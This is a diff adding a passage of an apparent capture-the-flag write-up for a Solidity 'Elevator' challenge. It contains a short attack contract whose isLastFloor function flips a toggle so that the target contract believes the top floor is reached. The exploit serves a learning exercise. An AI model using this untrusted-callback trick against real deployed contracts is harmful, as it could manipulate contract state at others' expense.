@@ -39,6 +39,38 @@ We get the "false" response, this means we aren't at the top of the building yet
 
 Lets check the floor we are at
 
+![image](https://github.com/user-attachments/assets/111dcded-99a1-4041-bc06-9c533ab567f9)
+
+We are at floor "0".
+
+To solve this chall we have to be on the last floor. Lets write our attack contract
+
+```sol
+//SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "./elevator.sol";
+
+contract elevatorAttack {
+   bool public toggle = true;
+   Elevator public target;
+
+   constructor(address _targetAddr) public {
+    target = Elevator(_targetAddr);
+   }
+   
+   function isLastFloor(uint) public returns (bool) {
+        toggle = !toggle;
+        return toggle;
+   }
+
+    function setFloor(uint _floor) public {
+        target.goTo(_floor);
+    }
+}
+```
+
 
 
 
